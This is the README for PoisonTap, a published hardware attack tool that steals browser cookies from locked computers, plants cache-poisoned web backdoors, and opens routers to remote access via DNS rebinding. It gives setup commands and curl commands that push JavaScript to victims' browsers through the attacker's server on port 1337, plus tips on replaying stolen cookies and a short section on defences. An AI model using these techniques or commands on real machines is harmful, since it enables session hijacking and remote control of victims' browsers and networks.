# [PoisonTap](https://samy.pl/poisontap/) - siphons cookies, exposes internal router & installs web backdoor on locked computers

Created by <a href="https://twitter.com/samykamkar" target=_blank>@SamyKamkar</a> || <a href="https://samy.pl" target=_blank>https://samy.pl</a>

When **[PoisonTap](https://samy.pl/poisontap)** (<a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> & Node.js) is plugged into a **locked/password protected** computer, it:

* emulates an Ethernet device over USB (or Thunderbolt)
* hijacks **all Internet traffic** from the machine (*despite* being a low priority/unknown network interface)
* siphons and stores HTTP cookies and sessions from the web browser for the Alexa top 1,000,000 websites
* exposes the **internal router** to the attacker, making it accessible **remotely** via outbound WebSocket and DNS rebinding (thanks <a href="https://maustin.net" target=_blank>Matt Austin</a> for rebinding idea!)
* installs a persistent web-based backdoor in HTTP cache for hundreds of thousands of domains and common Javascript CDN URLs, all with access to the user's cookies via cache poisoning
* allows attacker to **remotely** force the user to make HTTP requests and proxy back responses (GET & POSTs) with the **user's cookies** on any backdoored domain
* does **not** require the machine to be unlocked
* backdoors and remote access persist **even after device is removed** and attacker sashays away

![PoisonTap](https://samy.pl/poisontap/cropped6.gif)

*(incredible HTML5 canvas animation by <a href="https://codepen.io/ara_node/" target="_blank">Ara</a>)*

### PoisonTap evades the following security mechanisms:

* <a href="https://www.wikiwand.com/en/Lock_screen" target=_blank>Password Protected Lock Screens</a>
* <a href="https://www.wikiwand.com/en/Routing_table" target=_blank>Routing Table</a> priority and network interface Service Order
* <a href="https://www.wikiwand.com/en/Same-origin_policy" target=_blank>Same-Origin Policy</a>
* <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options" target=_blank>X-Frame-Options</a>
* <a href="https://www.owasp.org/index.php/HttpOnly" target=_blank>HttpOnly</a> Cookies
* <a href="https://www.chromestatus.com/feature/4672634709082112" target=_blank>SameSite</a> cookie attribute
* <a href="https://www.wikiwand.com/en/Multi-factor_authentication" target=_blank>Two-Factor/Multi-Factor Authentication</a> (2FA/MFA)
* <a href="https://www.wikiwand.com/en/DNS_rebinding" target=_blank>DNS Pinning</a>
* <a href="https://www.wikiwand.com/en/Cross-origin_resource_sharing" target=_blank>Cross-Origin Resource Sharing (CORS)</a>
* <a href="https://www.wikiwand.com/en/HTTPS" target=_blank>HTTPS cookie protection</a> when <a href="https://www.owasp.org/index.php/SecureFlag" target=_blank>Secure</a> cookie flag & <a href="https://www.wikiwand.com/en/HTTP_Strict_Transport_Security" target=_blank>HSTS</a> not enabled

------------

# Demo

PoisonTap is built for the $5 <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a> without any additional components other than a <a href="https://amzn.to/2fUMdah" target="_blank">micro-USB cable</a> & <a href="https://amzn.to/2fWgKsd" target="_blank">microSD card</a>, or can work on any Raspberry Pi (1/2/3) with an Ethernet-to-USB/Thunderbolt dongle, or can work on other devices that can emulate USB gadgets such as <a href="https://inversepath.com/usbarmory" target="_blank">USB Armory</a> and <a href="https://lanturtle.com/" target=_blank>LAN Turtle</a>.

**Live demonstration** and more details available in the video:
<a href="https://www.youtube.com/watch?v=Aatp5gCskvk" target="_blank"><img src= "https://samy.pl/poisontap/ptap-thumbnail-small.png" alt="MagSpoof" border="1" /></a>

**Point of Contact:** <a href="https://twitter.com/samykamkar" target=_blank>@SamyKamkar</a> // <a href="https://samy.pl" target=_blank>https://samy.pl</a>

**Released:** November 16, 2016

**Source code and download:** <a href="https://github.com/samyk/poisontap" target=_blank>https://github.com/samyk/poisontap</a>

-----

# How PoisonTap Works

PoisonTap produces a cascading effect by exploiting the existing trust in various mechanisms of a machine and network, including USB/Thunderbolt, DHCP, DNS, and HTTP, to produce a snowball effect of information exfiltration, network access and installation of semi-permanent backdoors.

![Network Hijacking](https://samy.pl/poisontap/network2.gif?)

In a nutshell, PoisonTap performs the following:


### *Network Hijacking*
* Attacker plugs PoisonTap (such as weaponized <a href="http://amzn.to/2eMr2WY" target="_blank">Raspberry Pi Zero</a>) into a locked computer (even if computer is password protected)
* PoisonTap emulates an Ethernet device (eg, Ethernet over USB/Thunderbolt) -- by default, Windows, OS X and Linux recognize an ethernet device, automatically loading it as a low-priority network device and performing a DHCP request across it, **even when the machine is locked or password protected**
* PoisonTap responds to the DHCP request and provides the machine with an IP address, however the DHCP response is crafted to tell the machine that the entire IPv4 space (0.0.0.0 - 255.255.255.255) is part of the PoisonTap's local network, rather than a small subnet (eg 192.168.0.0 - 192.168.0.255)
  * Normally it would be irrelevant if a secondary network device connects to a machine as it will be given lower priority than the existing (trusted) network device and won't supersede the gateway for Internet traffic, *but...*
  * Any routing table / gateway priority / network interface service order security is **bypassed** due to the priority of "LAN traffic" over "Internet traffic"
  * PoisonTap exploits this network access, even as a low priority network device, because **the *subnet* of a *low priority* network device is given higher priority than the *gateway* (default route) of the *highest priority* network device**
  * This means if traffic is destined to 1.2.3.4, while normally this traffic would hit the default route/gateway of the primary (non-PoisonTap) network device, PoisonTap actually gets the traffic because the PoisonTap "local" network/subnet supposedly contains 1.2.3.4, and every other IP address in existence ;)
  * Because of this, all Internet traffic goes over PoisonTap, even though the machine is connected to another network device with higher priority and proper gateway (the true wifi, ethernet, etc.)

![Cookie Siphoning](https://samy.pl/poisontap/cookies2.gif)

### *Cookie Siphoning*
* As long as a web browser is running the background, it is likely one of the open pages will perform an HTTP request in the background (for example to load a new ad, send data to an analytics platform, or simply continue to [track your web movements](https://samy.pl/evercookie/)) via AJAX or dynamic script/iframe tags
  * You can see this for yourself, go into your devtools/inspector (typically Cmd+Shift+I or Ctrl+Shift+I), go to a heavily visited website, click on the Network tab, and watch as remote resources continue to be accessed even as you take no action on the page
* Upon this HTTP request, because all traffic exits onto the PoisonTap device, PoisonTap DNS spoofs on the fly to return its own address, causing the HTTP request to hit the PoisonTap web server (<a href="https://nodejs.org/" target="_blank">Node.js</a>)
	* If the DNS server is pointing to an internal IP (LAN) that PoisonTap cannot get privilege for, the attack continues to function as the internal DNS server will produce public IP addresses for the various domains attacked, and it is the public IP addresses that PoisonTap has already hijacked
	* Once the internal DNS server responds, the web browser hits the public IP, ultimately hitting the PoisonTap web server (Node.js) in either scenario
* When the Node web server receives the request, PoisonTap responds with a response that can be interpreted as HTML or as Javascript, both of which execute properly (many websites will load HTML or JS in background requests)
* The HTML/JS-agnostic page then produces many hidden iframes, each iframe across a different Alexa-top-1-million domain
  * Any "X-Frame-Options" security on the domain is **bypassed** as PoisonTap is now the HTTP server and chooses which headers to send to the client
  * As every iframe HTTP request to a site is made (eg, http://nfl.com/PoisonTap), the HTTP cookies are sent from the browser to the "public IP" hijacked by PoisonTap, which swiftly logs the cookies/authentication information, **logging tens of thousands of the user's cookies into PoisonTap**
  * Any "HttpOnly" cookie security is **bypassed** and those cookies are captured as no Javascript is executed on the domain itself, but rather only used to load the iframe in the first place
  * Any Cross-Origin Resource Sharing or Same-Origin Policy security is **bypassed** as the domain being accessed appears legitimate to the browser
  * Because we're capturing cookies rather than credentials, any 2FA/MFA implemented on the site is **bypassed** when the attacker uses the cookie to login. This is because we're not actually performing the login function but rather continuing an already logged-in session which does **not** trigger two-factor authentication
  * If a server is using HTTPS, but the cookies do not explicitly set the <a href="https://www.owasp.org/index.php/SecureFlag" target="_blank">Secure</a> cookie flag, the HTTPS protection is **bypassed** and the cookie is sent to PoisonTap

![Internal Router Backdoor](https://samy.pl/poisontap/router2.gif)

### *Remotely Accessible Web-Based Backdoors*

* While PoisonTap was producing thousands of iframes, forcing the browser to load each one, these iframes are not just blank pages at all, but rather **HTML+Javascript backdoors** that are **cached indefinitely**
* Because PoisonTap force-caches these backdoors on each domain, the backdoor is tied to that domain, enabling the attacker to use the domain's cookies and launch same-origin requests in the future, even if the user is currently not logged in
  * For example, when the http://nfl.com/PoisonTap iframe is loaded, PoisonTap accepts the diverted Internet traffic, responds to the HTTP request via the Node web server
  * Additional HTTP headers are added to cache the page indefinitely
* The actual response of the page is a combination of HTML and Javascript that produces a persistent WebSocket out to the attacker's web server (over the Internet, not on the PoisonTap device)
  * The WebSocket remains open allowing the attacker to, at any point in the future, connect back to the backdoored machine and perform requests across any origin that has the backdoor implemented (the Alexa top 1,000,000 sites -- see below)
  * If the backdoor is opened on one site (e.g., nfl.com), but the user wishes to attack a different domain (e.g., pinterest.com), the attacker can load an iframe on nfl.com to the pinterest.com backdoor (http://pinterest.com/PoisonTap)
  * Again, any "X-Frame-Options", Cross-Origin Resource Sharing, and Same-Origin Policy security on the domain is entirely **bypassed** as the request will hit the cache that PoisonTap left rather than the true domain

<a href="http://amzn.to/2eMr2WY" target="_blank">![Raspberry Pi Zero](https://samy.pl/poisontap/straightened.jpg?0)</a>

### *Internal Router Backdoor & Remote Access*

* The one network PoisonTap is not able to hijack is the actual LAN subnet of the true network interface (for example, if the user's wifi subnet is 192.168.0.x, this network is unaffected), *but...*
* PoisonTap force-caches a backdoor on a special host, specifically the target router's IP prepended to ".ip.samy.pl", e.g. 192.168.0.1.ip.samy.pl, essentially producing a **persistent** DNS rebinding attack
  * When using PoisonTap as the DNS server (victim using public DNS server), PoisonTap responds with the specialized PoisonTap IP temporarily (1.0.0.1), meaning any requests at that moment will hit the PoisonTap web server
  * If instead the DNS server is set to the internal network (e.g., 192.168.0.x), an additional specially crafted request is made to 1.0.0.1**.pin.**ip.samy.pl which tells my specialized DNS server (on the public Internet) to **temporarily** respond to any [ip.address].ip.samy.pl address with the "pinned" address (1.0.0.1) for several seconds
  * PoisonTap then quickly sets a backdoor on http://192.168.0.1.ip.samy.pl/PoisonTap, which for the moment points to the PoisonTap device at 1.0.0.1, allowing the backdoor to be accessed and cached from the PoisonTap device
* DNS pinning and DNS rebinding security are **bypassed** due to exhausting the DNS pinning table, due to the hundreds of thousands of requests just previously made, and no rebinding needs to occur in the future, making this attack persistent over long periods of time (thanks to <a href="https://maustin.net" target=_blank>Matt Austin</a> for sharing this attack with me!)
* Now that a backdoor is force-cached to http://192.168.0.1.ip.samy.pl/PoisonTap, any future requests to the 192.168.0.1.ip.samy.pl will hit the **unpinned** IP address, causing 192.168.0.1 to resolve instead, pointing directly to the router
* This means if loading the 192.168.0.1.ip.samy.pl/PoisonTap host in an iframe remotely over the backdoor, you can now perform AJAX GET/POSTs to **any other page** on the internal router, **entirely remotely**, thus allowing remote access to the internal router
  * This can lead to other attacks on the router which the attacker may have never had access to in the first place, such as default admin credentials on the router being used to overwrite DNS servers, or other authentication vulnerabilities being exposed

<img src="https://samy.pl/poisontap/pin2.png?1" alt="DNS Rebinding" />

#### Recap of the DNS server:

* [ip.addy].ip.samy.pl **normally** responds with [ip.addy]
* 192.168.0.1.ip.samy.pl -> 192.168.0.1 (A record)
* [ip.addy].pin.ip.samy.pl **temporarily** (~5 seconds) points *.ip.samy.pl to [ip.addy] 
  * 1.0.0.1.pin.ip.samy.pl -> 1.0.0.1
  * 192.168.0.1.ip.samy.pl -> 1.0.0.1 (A record, short TTL)
  * *(after ~5 seconds)*
  * 192.168.0.1.ip.samy.pl -> 192.168.0.1 (A record) 

### Additional Remotely Accessible Web-Based Backdoors

* Additionally, PoisonTap replaces thousands of common, CDN-based Javascript files, e.g. Google and jQuery CDNs, with the correct code plus a backdoor that gives the attacker access to any domain loading the infected CDN-based Javascript file
* Because a backdoor is left on each domain, this allows the attacker to remotely force the backdoored browser to perform **same-origin** requests (AJAX GET/POSTs) on virtually any major domain, even if the victim does not currently have any open windows to that domain
* The backdoor will now live on any additional site that also uses one of these infected, HTTP-based, CDN Javascript frameworks when the victim visits the site

-----

![PoisonTap](https://samy.pl/poisontap/ptplug.jpg)

# Securing Against PoisonTap

### Server-Side Security

If you are running a web server, securing against PoisonTap is simple:

* **Use HTTPS exclusively**, at the very least for authentication and authenticated content
  * Honestly, you should use HTTPS exclusively and always redirect HTTP content to HTTPS, preventing a user being tricked into providing credentials or other PII over HTTP
* Ensure Secure flag is enabled on cookies, preventing HTTPS cookies from leaking over HTTP
* When using remote Javascript resources, use the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" target=_blank>Subresource Integrity</a> script tag attribute
* Use <a href="https://www.wikiwand.com/en/HTTP_Strict_Transport_Security" target=_blank>HSTS</a> to prevent HTTPS downgrade attacks


### Desktop Security

* Adding <a href="https://amzn.to/2fX0I1e" target=_blank>cement</a> to your USB and Thunderbolt ports can be effective
* Closing your browser every time you walk away from your machine can work, but is entirely impractical
* Disabling USB/Thunderbolt ports is also effective, though also impractical
* Locking your computer has **no effect** as the network and USB stacks operate while the machine is locked, however, going into an encrypted sleep mode where a key is required to decrypt memory (e.g., FileVault2 + deep sleep) solves most of the issues as your browser will no longer make requests, even if woken up

-----
# Download

**Source code:** <a href="https://github.com/samyk/poisontap" target=_blank>https://github.com/samyk/poisontap</a>

-----

# Installation / File Breakdown

Note: If you find the device is NOT acting as an Ethernet controller automatically (older versions of Windows, for example), you can [change the VID and PID in pi_startup.sh](https://github.com/samyk/poisontap/issues/8#issuecomment-265818957)

```bash
# Instructions adjusted from https://gist.github.com/gbaman/50b6cca61dd1c3f88f41
sudo bash

# If Raspbian BEFORE 2016-05-10, then run next line:
BRANCH=next rpi-update

echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces
echo "dtoverlay=dwc2" >> /boot/config.txt
echo -e "dwc2\ng_ether" >> /etc/modules
sudo sed --in-place "/exit 0/d" /etc/rc.local
echo "/bin/sh /home/pi/poisontap/pi_startup.sh" >> /etc/rc.local
mkdir /home/pi/poisontap
chown -R pi /home/pi/poisontap
apt-get update && apt-get upgrade
apt-get -y install isc-dhcp-server dsniff screen nodejs
```

Place dhcpd.conf in /etc/dhcp/dhcpd.conf and the rest of the files in /home/pi/poisontap, then reboot to ensure everything is working.

There are a number of <a href="https://github.com/samyk/poisontap" target=_blank>files in the repo</a>, which are used on different sides. The list:

* **backdoor.html** - Whenever a http://hostname/PoisonTap URL is hit to exfiltrate cookies, this file is what is returned as the force-cached content. It contains a backdoor that produces an outbound websocket to samy.pl:1337 (adjustable to any host/port) that remains opens waiting for commands from the server. This means when you load an iframe on a site, such as http://hostname/PoisonTap, this is the content that gets populated (even after PoisonTap is removed from the machine).
* **backend_server.js** - This is the Node.js server that you run on your Internet-accessible server. It is what the backdoor.html connects to (eg, samy.pl:1337). This is the same server you connect to send commands to your PoisonTapped minion machines, eg

```bash
# pop alert to victim
curl 'http://samy.pl:1337/exec?alert("muahahahaha")'
# to set a cookie on victim
curl 'http://samy.pl:1337/exec?document.cookie="key=value"'
# to force victim to load a url via ajax (note, jQuery is stored inside the backdoor)
curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",function(d)\{console.log(d)\})'
```
* **pi_poisontap.js** - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by PoisonTap, storing siphoned cookies, and injecting the cached backdoors.
* **pi_startup.sh** - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_poisontap.js above. 
* **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara oen CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
* **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.

-----

# Frequently Asked Questions

* **Q:** How do you add additional domains to be backdoored?
* **A:** The list of domains to be backdoored is set in `target_injected_xhtmljs.html` by the `getDoms()` function. This itself is populated by the `alexa1m.sh` script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in `getDoms()`.
* **Q:** How do you use the captured cookies?
* **A:** You can use the [Document.cookie API](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) directly from the JavaScript console in your browser to set cookies. [This StackOverflow post](https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome) also has a few Chrome-specific suggestions, for example the [Cookie Inspector](https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn) Chrome extension.
* **Q:** How do I clean Poisontap from a machine?
* **A:** You should clear the local OS DNS cache, as well as any browser caches. You may also need to invalidate any logged-in sessions at the time, which may have leaked cookies. Ensure that these invalidate existing cookies, rather than simply logging you out. (If you want to safetly work with a PoisonTap device on your current machine, make sure to exit any browser, then you should be able to safetly connect it to your machine).

-----

# Contact

**Point of Contact:** <a href="https://twitter.com/samykamkar" target=_blank>@SamyKamkar</a>

You can see more of my projects or contact me at <a href="https://samy.pl" target=_blank>https://samy.pl</a>.
